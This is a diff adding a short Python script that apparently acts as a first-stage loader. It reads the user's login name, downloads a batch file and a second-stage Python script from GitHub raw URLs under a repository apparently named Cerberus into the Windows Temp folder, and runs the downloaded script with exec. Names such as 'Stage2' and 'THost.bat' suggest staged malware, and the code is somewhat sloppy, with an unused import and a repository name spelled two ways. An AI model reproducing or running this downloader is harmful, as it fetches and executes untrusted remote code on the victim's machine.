@@ -1,0 +1,16 @@
+import os.path
+import urllib.request
+from bs4 import BeautifulSoup
+
+x = os.getlogin()
+
+path = "/Users/shrek/AppData/Local/Temp/Stage2.py"
+
+if os.path.isfile(path) == False:
+    file = open('Stage2.py', 'a')
+    file.close()
+
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource1.txt", "/Users/shrek/AppData/Local/Temp/THost.bat")
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cereberus/main/Stage2Source.txt", "/Users/shrek/AppData/Local/Temp/Stage2.py")
+
+exec(open("/Users/shrek/AppData/Local/Temp/Stage2.py").read())
